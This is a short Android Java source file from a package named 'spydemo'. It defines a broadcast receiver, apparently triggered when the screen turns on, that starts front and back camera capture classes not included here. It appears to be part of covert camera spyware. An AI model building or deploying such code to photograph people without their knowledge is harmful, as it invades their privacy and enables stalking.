package com.spy.spydemo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class ScreenOnReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        FrontCamera frontCamera = new FrontCamera(context);
        frontCamera.run();

        BackCamera backCamera = new BackCamera(context);
        backCamera.run();
    }
}
